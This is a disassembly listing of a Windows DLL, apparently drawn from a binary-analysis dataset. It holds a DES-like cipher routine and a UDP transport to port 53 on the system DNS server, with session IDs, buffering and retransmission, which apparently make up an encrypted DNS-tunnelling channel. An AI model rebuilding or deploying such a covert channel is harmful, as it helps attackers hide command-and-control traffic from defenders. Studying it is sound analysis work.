sub_10001064
push ebp
mov ebp esp
push esi
push edi
xor edi edi
add edx 0x2
mov eax [ ebp + 0x8 ]
lea esi [ edi + eax ]
mov al [ esi ]
push 0x7
pop ecx
call sub_10001000
mov [ edx - 0x2 ] al
mov al [ esi ]
push 0x6
pop ecx
call sub_10001000
mov [ edx - 0x1 ] al
mov al [ esi ]
push 0x5
pop ecx
call sub_10001000
mov [ edx ] al
mov al [ esi ]
push 0x4
pop ecx
call sub_10001000
mov [ edx + 0x1 ] al
mov al [ esi ]
push 0x3
pop ecx
call sub_10001000
mov [ edx + 0x2 ] al
mov al [ esi ]
push 0x2
pop ecx
call sub_10001000
mov [ edx + 0x3 ] al
mov al [ esi ]
xor ecx ecx
inc ecx
call sub_10001000
mov [ edx + 0x4 ] al
mov al [ esi ]
xor ecx ecx
call sub_10001000
mov [ edx + 0x5 ] al
inc edi
add edx 0x8
cmp edi 0x8
jl r-xdata
pop edi
pop esi
pop ebp
retn
sub_100010e7
push ebp
mov ebp esp
xor ecx ecx
add eax 0x2
push esi
mov dl [ eax - 0x2 ]
add dl dl
add dl [ eax - 0x1 ]
mov esi [ ebp + 0x8 ]
add dl dl
add dl [ eax ]
add eax 0x8
add dl dl
add dl [ eax - 0x7 ]
add dl dl
add dl [ eax - 0x6 ]
add dl dl
add dl [ eax - 0x5 ]
add dl dl
add dl [ eax - 0x4 ]
add dl dl
add dl [ eax - 0x3 ]
mov [ ecx + esi ] dl
inc ecx
cmp ecx 0x8
jl r-xdata
pop esi
pop ebp
retn
sub_10001127
push ebp
mov ebp esp
push ecx
push ebx
push edi
push [ ebp + 0xc ]
mov edi eax
call [ malloc@IAT ]
cmp [ ebp + 0xc ] 0x0
pop ecx
mov ebx eax
jle r-xdata
push [ ebp + 0xc ]
push ebx
push [ ebp + 0x10 ]
call [ memcpy@IAT ]
push ebx
call [ free@IAT ]
add esp 0x10
pop edi
pop ebx
leave
retn
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
sub esi edi
mov ecx ebx
sub edi ebx
mov [ ebp - 0x4 ] eax
lea eax [ edi + ecx ]
movzx edx [ eax + esi ]
movzx eax [ eax ]
add edx eax
dec edx
neg edx
sbb dl dl
inc dl
mov [ ecx ] dl
inc ecx
dec [ ebp - 0x4 ]
jne r-xdata
pop esi
sub_10001188
push ebp
mov ebp esp
push esi
push edi
call [ malloc@IAT ]
mov esi eax
xor eax eax
pop ecx
test edi edi
jle r-xdata
push edi
push esi
push [ ebp + 0x10 ]
call [ memcpy@IAT ]
push esi
call [ free@IAT ]
add esp 0x10
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + eax * 4 ]
mov edx [ ebp + 0x8 ]
mov cl [ ecx + edx - 0x1 ]
mov [ esi + eax ] cl
inc eax
cmp eax edi
jl r-xdata
sub_100011c9
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ memcpy@IAT ]
push edi
mov [ ebp - 0x24 ] 0x1c
sub [ ebp - 0x24 ] ebx
push [ ebp - 0x24 ]
mov edi ecx
lea eax [ ebx + edi ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call esi
push ebx
lea eax [ ebp - 0x4 ]
sub eax ebx
push edi
push eax
mov [ ebp - 0x28 ] eax
call esi
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
push edi
call esi
push [ ebp - 0x24 ]
lea eax [ ebx + edi + 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call esi
push ebx
add edi 0x1c
push edi
push [ ebp - 0x28 ]
call esi
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
push edi
call esi
mov ecx [ ebp - 0x4 ]
add esp 0x48
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn
sub_10001242
push ebp
mov ebp esp
movzx edx [ eax ]
push esi
movzx esi [ eax + 0x5 ]
lea edx [ esi + edx * 2 ]
movzx esi [ eax + 0x1 ]
lea edx [ esi + edx * 2 ]
movzx esi [ eax + 0x2 ]
lea edx [ esi + edx * 2 ]
movzx esi [ eax + 0x3 ]
movzx eax [ eax + 0x4 ]
add eax [ ebp + 0x8 ]
lea edx [ esi + edx * 2 ]
mov al [ eax + edx * 2 ]
xor dl dl
pop esi
cmp al 0x8
jb r-xdata
mov [ ecx ] dl
mov [ ecx ] 0x1
add al 0xf8
jmp r-xdata
mov [ ecx + 0x1 ] dl
mov [ ecx + 0x1 ] 0x1
add al 0xfc
jmp r-xdata
cmp al 0x4
jb r-xdata
mov [ ecx + 0x2 ] dl
mov [ ecx + 0x2 ] 0x1
add al 0xfe
jmp r-xdata
cmp al 0x2
jb r-xdata
mov [ ecx + 0x3 ] al
pop ebp
retn
sub_100012a2
push ebp
mov ebp esp
sub esp 0x12c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi edx
push eax
lea edx [ ebp - 0x94 ]
mov [ ebp - 0x12c ] ecx
call sub_10001064
push esi
lea edx [ ebp - 0xf4 ]
call sub_10001064
lea eax [ ebp - 0x94 ]
push eax
push rw-data
push eax
push 0x40
pop edi
call sub_10001188
lea eax [ ebp - 0xf4 ]
push eax
push rw-data
push eax
push 0x38
pop edi
call sub_10001188
mov esi [ memcpy@IAT ]
push 0x20
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0xb4 ]
push eax
call esi
push 0x20
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call esi
add esp 0x38
mov [ ebp - 0x128 ] rw-data
mov eax [ ebp - 0x128 ]
mov ebx [ eax ]
lea ecx [ ebp - 0xf4 ]
call sub_100011c9
lea eax [ ebp - 0x124 ]
push eax
push rw-data
lea eax [ ebp - 0xf4 ]
push eax
push 0x30
pop edi
call sub_10001188
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push rw-data
push eax
call sub_10001188
lea eax [ ebp - 0x34 ]
push eax
push edi
push eax
lea eax [ ebp - 0x124 ]
call sub_10001127
lea ecx [ ebp - 0x34 ]
push rw-data
mov eax ecx
call sub_10001242
push rw-data
lea ecx [ ebp - 0x30 ]
lea eax [ ebp - 0x2e ]
call sub_10001242
push rw-data
lea ecx [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
call sub_10001242
push rw-data
lea ecx [ ebp - 0x28 ]
lea eax [ ebp - 0x22 ]
call sub_10001242
push rw-data
lea ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x1c ]
call sub_10001242
push rw-data
lea ecx [ ebp - 0x20 ]
lea eax [ ebp - 0x16 ]
call sub_10001242
push rw-data
lea ecx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_10001242
add esp 0x40
push rw-data
lea ecx [ ebp - 0x18 ]
lea eax [ ebp - 0xa ]
call sub_10001242
lea eax [ ebp - 0x34 ]
push eax
push rw-data
push eax
push 0x20
pop edi
call sub_10001188
lea eax [ ebp - 0x34 ]
push eax
push edi
push eax
lea eax [ ebp - 0xb4 ]
call sub_10001127
push edi
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xb4 ]
push eax
call esi
push edi
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call esi
add [ ebp - 0x128 ] 0x4
add esp 0x34
cmp [ ebp - 0x128 ] rw-data
jl r-xdata
push edi
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x94 ]
push eax
call esi
push edi
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
call esi
lea eax [ ebp - 0x94 ]
push eax
push rw-data
push eax
push 0x40
pop edi
call sub_10001188
push [ ebp - 0x12c ]
lea eax [ ebp - 0x94 ]
call sub_100010e7
mov ecx [ ebp - 0x4 ]
add esp 0x28
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
sub_100014d7
push ebp
mov ebp esp
push ecx
push ebx
push edi
push [ esi + 0x19050 ]
call [ ResetEvent@IAT ]
mov [ esi + 0x19034 ] edi
mov [ esi + 0x19004 ] edi
mov [ esi + 0x19000 ] edi
xor eax eax
pop edi
mov [ esi + 0x19030 ] ax
pop ebx
leave
retn
mov eax [ esi + 0x19024 ]
mov edx [ eax ]
dec ecx
mov [ esi + 0x19028 ] ecx
shl ecx 0x2
push ecx
lea ecx [ eax + 0x4 ]
push ecx
push eax
mov [ ebp - 0x4 ] edx
call [ memmove@IAT ]
mov edi [ esi + 0x19028 ]
mov eax [ esi + 0x1902c ]
sub eax edi
add esp 0xc
cmp eax 0x14
jb r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
jmp r-xdata
mov ebx [ esi + 0x19024 ]
lea eax [ edi * 4 + 0x28 ]
push eax
call [ malloc@IAT ]
pop ecx
mov [ esi + 0x19024 ] eax
test eax eax
je r-xdata
mov ecx [ esi + 0x19028 ]
xor edi edi
cmp ecx edi
je r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x19028 ]
add eax 0xa
mov [ esi + 0x1902c ] eax
mov ecx edi
shl ecx 0x2
push ecx
push ebx
push eax
call [ memcpy@IAT ]
add esp 0xc
sub_100015a1
push ebp
mov ebp esp
push ecx
push ebx
push edi
jmp r-xdata
lea edi [ ebp - 0x4 ]
lea eax [ esi + 0x19008 ]
call sub_100031bc
test al al
jne r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
lea eax [ esi + 0x19034 ]
push eax
call [ DeleteCriticalSection@IAT ]
push [ esi + 0x19030 ]
call [ CloseHandle@IAT ]
lea ecx [ esi + 0x19008 ]
call sub_10003138
pop edi
pop ebx
leave
retn
sub_10001614
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ GetNetworkParams@IAT ]
lea eax [ ebp - 0x4 ]
xor ebx ebx
push eax
push ebx
mov [ ebp - 0x4 ] ebx
call esi
cmp eax 0x6f
jne r-xdata
pop esi
mov eax ebx
pop ebx
leave
retn
push edi
push [ ebp - 0x4 ]
call [ malloc@IAT ]
mov edi eax
pop ecx
cmp edi ebx
je r-xdata
pop edi
lea eax [ ebp - 0x4 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
push edi
call [ free@IAT ]
pop ecx
lea eax [ edi + 0x110 ]
push eax
call [ inet_addr@IAT ]
mov ebx eax
sub_1000166b
push ebx
push edi
lea eax [ esi + 0x19018 ]
mov [ esi ] r--data
push eax
mov [ esi + 0x19014 ] r--data
call [ InitializeCriticalSection@IAT ]
xor ebx ebx
mov [ esi + 0x19030 ] ebx
mov [ esi + 0x19034 ] ebx
mov [ esi + 0x19038 ] ebx
xor eax eax
mov [ esi + 0x1903c ] ax
lea eax [ esi + 0x19044 ]
push eax
mov [ esi + 0x19040 ] ebx
mov [ esi + 0x19010 ] ebx
mov [ esi + 0x1900c ] ebx
call [ InitializeCriticalSection@IAT ]
push ebx
push ebx
push ebx
push ebx
call [ CreateEventA@IAT ]
mov [ esi + 0x1905c ] eax
lea eax [ esi + 0x3206c ]
push eax
mov [ esi + 0x32068 ] r--data
call [ InitializeCriticalSection@IAT ]
lea eax [ esi + 0x32094 ]
mov [ esi + 0x32084 ] ebx
mov [ esi + 0x32088 ] ebx
mov [ esi + 0x3208c ] ebx
push eax
mov [ esi + 0x32064 ] ebx
mov [ esi + 0x32060 ] ebx
call [ InitializeCriticalSection@IAT ]
push ebx
push ebx
push ebx
push ebx
call [ CreateEventA@IAT ]
mov [ esi + 0x32090 ] eax
pop edi
mov [ esi + 0x320b4 ] bl
mov [ esi + 0x320f8 ] ebx
mov [ esi + 0x32104 ] ebx
mov [ esi + 0x320b0 ] ebx
mov [ esi + 0x32100 ] ebx
mov [ esi + 0x3210c ] ebx
mov [ esi + 0x32108 ] ebx
mov [ esi + 0x320ac ] ebx
mov [ esi + 0x320f4 ] ebx
mov [ esi + 0x8 ] ebx
mov eax esi
pop ebx
retn
sub_10001766
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10001786
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_100017ab
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax ecx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ eax + 0x320ac ]
mov [ ebp - 0x18 ] 0x10
call [ getsockname@IAT ]
test eax eax
js r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn
sub_100017f5
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax ecx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x320b0 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ eax + 0x320ac ]
mov [ ebp - 0x18 ] 0x10
call [ getpeername@IAT ]
test eax eax
js r-xdata
mov eax [ eax + 0x320f4 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn
mov eax [ ebp - 0x10 ]
sub_10001857
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0x34 ] eax
cmp [ eax ] bl
jne r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ rand@IAT ]
mov [ ebp - 0x30 ] ebx
mov [ esi + 0x320b0 ] ebx
call edi
movzx eax ax
shl eax 0x10
mov [ ebp - 0x2c ] eax
call edi
movzx eax ax
or eax [ ebp - 0x2c ]
push 0x40
push [ ebp - 0x34 ]
mov [ esi + 0x320fc ] eax
lea eax [ esi + 0x320b4 ]
push eax
call [ strncpy@IAT ]
mov eax [ ebp + 0xc ]
add esp 0xc
push 0x11
push 0x2
push 0x2
mov [ esi + 0x320f3 ] bl
mov [ esi + 0x320f8 ] eax
call [ socket@IAT ]
mov edi eax
push 0x10
lea eax [ ebp - 0x28 ]
push ebx
push eax
mov [ ebp - 0x2c ] edi
call [ memset@IAT ]
add esp 0xc
push 0x2
pop eax
mov [ ebp - 0x28 ] ax
mov eax [ esi + 0x320f8 ]
push 0x35
mov [ ebp - 0x24 ] eax
call [ htons@IAT ]
mov [ ebp - 0x26 ] ax
push 0x10
lea eax [ ebp - 0x28 ]
push eax
push edi
call [ connect@IAT ]
test eax eax
jns r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x8
push [ esi + 0x320f8 ]
mov eax [ esi + 0x320fc ]
push edi
push esi
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ebx
call sub_1000296c
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push edi
mov [ esi + 0x4 ] eax
call [ closesocket@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ closesocket@IAT ]
push ebx
push edi
push 0x7d0
call sub_100072aa
add esp 0xc
test eax eax
jle r-xdata
pop edi
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x3c ] ebx
push edi
lea ebx [ ebp - 0x3c ]
lea edi [ ebp - 0x38 ]
mov ecx esi
call sub_10002881
test eax eax
je r-xdata
mov edi [ ebp - 0x2c ]
mov edi [ ebp - 0x38 ]
mov eax [ edi ]
xor ebx ebx
cmp eax [ ebp - 0x18 ]
jne r-xdata
push edi
call [ free@IAT ]
pop ecx
cmp [ ebp - 0x30 ] ebx
je r-xdata
cmp [ edi + 0xc ] ebx
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ esi + 0x320ac ] eax
jmp r-xdata
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x30 ]
cmp [ edi + 0x10 ] ebx
jne r-xdata
cmp [ edi + 0x4 ] ebx
jne r-xdata
lea eax [ esi + 0x32108 ]
push eax
push ebx
push esi
push sub_100015ed
push ebx
push ebx
mov [ esi + 0x32104 ] ebx
call [ CreateThread@IAT ]
mov [ esi + 0x3210c ] eax
cmp eax ebx
jne r-xdata
xor eax eax
inc eax
mov ecx eax
mov [ esi + 0x1903c ] cx
mov [ esi + 0x19040 ] eax
mov [ esi + 0x8 ] eax
mov [ ebp - 0x30 ] eax
call [ GetLastError@IAT ]
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_10001a39
push ebp
mov ebp esp
push ecx
mov eax [ ebx + 0x3210c ]
push esi
xor esi esi
push edi
mov [ ebx + 0x8 ] esi
cmp eax esi
je r-xdata
mov eax [ ebx + 0x320ac ]
cmp eax esi
je r-xdata
push 0xffffffff
push eax
mov [ ebx + 0x32104 ] 0x1
call [ WaitForSingleObject@IAT ]
push esi
push [ ebx + 0x3210c ]
call [ TerminateThread@IAT ]
push [ ebx + 0x3210c ]
call [ CloseHandle@IAT ]
mov [ ebx + 0x3210c ] esi
lea edi [ ebp - 0x4 ]
lea eax [ ebx + 0x32068 ]
call sub_100031bc
test al al
jne r-xdata
push eax
call [ closesocket@IAT ]
mov [ ebx + 0x320ac ] esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
push [ ebx + 0x32090 ]
call [ ResetEvent@IAT ]
mov [ ebx + 0x32064 ] esi
mov [ ebx + 0x32060 ] esi
lea esi [ ebx + 0xc ]
call sub_100014d7
and [ ebx + 0x320f8 ] 0x0
pop edi
mov [ ebx + 0x320b4 ] 0x0
pop esi
leave
retn
sub_10001ae7
push ebp
mov ebp esp
xor ecx ecx
cmp [ eax + 0x32100 ] ecx
je r-xdata
cmp [ eax + 0x32104 ] ecx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ eax + 0x8 ] ecx
je r-xdata
pop ebp
retn 0x4
cmp [ eax + 0x32060 ] ecx
je r-xdata
push [ ebp + 0x8 ]
push [ eax + 0x32090 ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
xor ecx ecx
cmp eax 0xffffffff
setne cl
lea eax [ ecx + ecx - 0x1 ]
xor eax eax
jmp r-xdata
sub_10001b3d
push ebp
mov ebp esp
xor ecx ecx
cmp [ eax + 0x32100 ] ecx
je r-xdata
cmp [ eax + 0x32104 ] ecx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ eax + 0x8 ] ecx
je r-xdata
pop ebp
retn 0x4
cmp [ eax + 0x1900c ] 0x19000
jae r-xdata
push [ ebp + 0x8 ]
push [ eax + 0x1905c ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
xor ecx ecx
cmp eax 0xffffffff
setne cl
lea eax [ ecx + ecx - 0x1 ]
xor eax eax
jmp r-xdata
sub_10001b97
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x18
xor esi esi
lea eax [ ebp - 0x1c ]
push esi
push eax
mov [ ebp - 0x20 ] ecx
call [ memset@IAT ]
mov ebx [ ebp + 0x10 ]
lea eax [ ebx + 0x18 ]
add esp 0xc
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] esi
mov esi [ ebp - 0x20 ]
push 0x18
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
call sub_10001d0e
test eax eax
jns r-xdata
push ebx
mov ecx edi
call sub_10001d0e
xor ecx ecx
test eax eax
setns cl
lea eax [ ecx + ecx - 0x1 ]
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0xc
sub_10001c11
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0xc ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x10 ]
push edi
mov esi ecx
mov [ ebp - 0x2c ] eax
xor edi edi
or eax 0xffffffff
jmp r-xdata
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn 0xc
push 0x18
pop eax
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
call sub_10001dd4
test eax eax
jle r-xdata
test edi edi
jne r-xdata
add edi eax
cmp edi 0x18
jb r-xdata
push 0x7530
mov eax esi
call sub_10001ae7
test eax eax
js r-xdata
mov edi [ ebp - 0x1c ]
cmp edi 0x18
jb r-xdata
cmp edi 0x6400000
ja r-xdata
push ebx
add edi 0xffffffe8
push edi
call [ malloc@IAT ]
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
push 0x0
push ebx
call [ memset@IAT ]
and [ ebp - 0x20 ] 0x0
add esp 0xc
test edi edi
je r-xdata
pop ebx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] edi
mov eax [ ebp - 0x24 ]
mov [ eax ] ebx
mov eax [ ebp - 0x18 ]
mov [ ecx ] eax
mov eax edi
push 0x7530
mov eax esi
call sub_10001ae7
test eax eax
js r-xdata
je r-xdata
mov eax [ ebp - 0x20 ]
mov ecx edi
sub ecx eax
push ecx
add eax ebx
push eax
call sub_10001dd4
test eax eax
jle r-xdata
add [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] edi
jb r-xdata
sub_10001d0e
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
xor eax eax
cmp [ esi + 0x32100 ] eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ esi + 0x32104 ] eax
jne r-xdata
pop edi
pop ebx
leave
retn 0x4
cmp [ esi + 0x8 ] eax
je r-xdata
lea ebx [ esi + 0x19044 ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0x1900c ]
mov edi 0x19000
sub edi eax
cmp edi [ ebp + 0x8 ]
jbe r-xdata
test edi edi
je r-xdata
mov edi [ ebp + 0x8 ]
push ebx
call [ LeaveCriticalSection@IAT ]
push 0x7530
push [ esi + 0x1905c ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
push edi
push [ ebp - 0x4 ]
lea eax [ eax + esi + 0xc ]
push eax
call [ memcpy@IAT ]
add [ esi + 0x1900c ] edi
sub [ ebp + 0x8 ] edi
add [ ebp - 0x4 ] edi
add esp 0xc
push ebx
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
or [ ebp - 0x8 ] 0xffffffff
sub_10001dd4
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
cmp [ esi + 0x32100 ] ebx
je r-xdata
cmp [ esi + 0x32104 ] ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ esi + 0x8 ] ebx
je r-xdata
pop ebx
leave
retn 0x8
lea eax [ esi + 0x32094 ]
push edi
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov edi [ esi + 0x32060 ]
cmp edi [ ebp + 0xc ]
jb r-xdata
cmp edi ebx
je r-xdata
mov edi [ ebp + 0xc ]
push [ ebp - 0x4 ]
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
push edi
lea ebx [ esi + 0x19060 ]
push ebx
push [ ebp + 0x8 ]
call [ memcpy@IAT ]
mov eax [ esi + 0x32060 ]
sub eax edi
push eax
lea eax [ edi + esi + 0x19060 ]
push eax
push ebx
call [ memmove@IAT ]
add esp 0x18
sub [ esi + 0x32060 ] edi
jne r-xdata
push [ esi + 0x32090 ]
call [ ResetEvent@IAT ]
sub_10001e69
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
push 0x0
push 0x2710
push eax
push ecx
call sub_10015050
leave
retn
sub_10001e8e
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
call sub_10001e69
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] edx
call sub_10001e69
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
jmp r-xdata
cmp [ esi + 0x32104 ] 0x0
je r-xdata
cmp [ esi + 0x32100 ] 0x0
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
push 0x0
push [ esi + 0x320ac ]
push 0x64
call sub_100072aa
add esp 0xc
test eax eax
jle r-xdata
lea eax [ esi + 0x19044 ]
push eax
mov [ ebp - 0x10 ] eax
call [ EnterCriticalSection@IAT ]
xor ebx ebx
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0x320ac ]
lea ebx [ ebp - 0x30 ]
lea edi [ ebp - 0x8 ]
mov ecx esi
call sub_10002881
test eax eax
je r-xdata
cmp ebx [ esi + 0x19034 ]
jb r-xdata
mov edi [ ebp - 0x8 ]
mov eax [ edi ]
cmp eax [ esi + 0x320fc ]
jne r-xdata
mov eax [ esi + 0x19030 ]
mov edi [ eax + ebx * 4 ]
push 0x0
call [ _time64@IAT ]
sub eax [ edi + 0x8 ]
pop ecx
sbb edx [ edi + 0xc ]
mov [ ebp - 0x1c ] edx
js r-xdata
jmp r-xdata
cmp [ edi + 0xc ] 0x0
mov eax [ edi + 0x4 ]
mov [ ebp - 0x1c ] eax
je r-xdata
inc ebx
jg r-xdata
cmp [ esi + 0x19034 ] 0x5
jae r-xdata
lea eax [ esi + 0x32094 ]
push eax
mov [ ebp - 0x18 ] eax
call [ EnterCriticalSection@IAT ]
add esi 0x32068
push edi
mov [ ebp - 0x14 ] esi
call sub_1000315c
mov ebx [ ebp + 0x8 ]
xor edx edx
cmp [ ebx + 0x32088 ] edx
jbe r-xdata
call sub_10001e69
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
cmp [ edi + 0x4 ] 0x4
jge r-xdata
cmp eax 0xf
jbe r-xdata
push [ ebp - 0x10 ]
call [ LeaveCriticalSection@IAT ]
call sub_100026de
cmp [ eax + 0xc ] 0x0
mov [ ebp - 0x8 ] eax
jne r-xdata
push [ ebp - 0x18 ]
call [ LeaveCriticalSection@IAT ]
lea eax [ ebx + 0x19044 ]
push eax
mov [ ebp - 0x10 ] eax
call [ EnterCriticalSection@IAT ]
xor edi edi
cmp [ ebx + 0x19034 ] edi
jbe r-xdata
cmp edx [ esi + 0x20 ]
jae r-xdata
xor eax eax
inc eax
mov [ esi + 0x32100 ] eax
mov [ esi + 0x32104 ] eax
mov [ esi + 0x4 ] 0x5b4
push 0x0
call [ _time64@IAT ]
inc [ edi + 0x4 ]
pop ecx
push 0x10
mov [ edi + 0x8 ] eax
lea eax [ edi + 0x10 ]
push eax
push 0x0
push [ edi + 0x48 ]
mov [ edi + 0xc ] edx
add edi 0x4c
push edi
push [ esi + 0x320ac ]
call [ sendto@IAT ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
call sub_10001e69
mov ebx eax
sub ebx [ ebp - 0x40 ]
mov edi edx
sbb edi [ ebp - 0x3c ]
js r-xdata
push [ ebp - 0x10 ]
call [ LeaveCriticalSection@IAT ]
mov esi ebx
lea esi [ ebx + 0x19014 ]
inc edx
cmp edx [ ebx + 0x32088 ]
jb r-xdata
mov eax [ esi + 0x1c ]
mov edi [ eax + edx * 4 ]
mov eax [ edi + 0x8 ]
mov [ ebp - 0x8 ] edi
cmp eax [ ebx + 0x32064 ]
jne r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x1903c ]
mov eax [ ebp - 0x8 ]
mov esi edx
inc edx
mov [ ecx + 0x1903c ] dx
mov edx [ ecx + 0x19040 ]
inc edx
mov [ eax + 0x4 ] edx
lea edx [ ebp - 0x24 ]
push edx
lea edx [ ebp - 0xc ]
push edx
push esi
add ecx 0x320b4
push ecx
mov ecx [ eax + 0xc ]
add ecx 0x14
push ecx
push eax
call sub_10002a9f
test eax eax
je r-xdata
test edi edi
jl r-xdata
jg r-xdata
inc edi
cmp edi [ ebx + 0x19034 ]
jb r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + edi * 4 ]
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x24 ] ecx
jne r-xdata
mov eax 0x19000
sub eax [ ebx + 0x32060 ]
cmp eax [ edi + 0xc ]
jb r-xdata
mov esi [ ebp + 0x8 ]
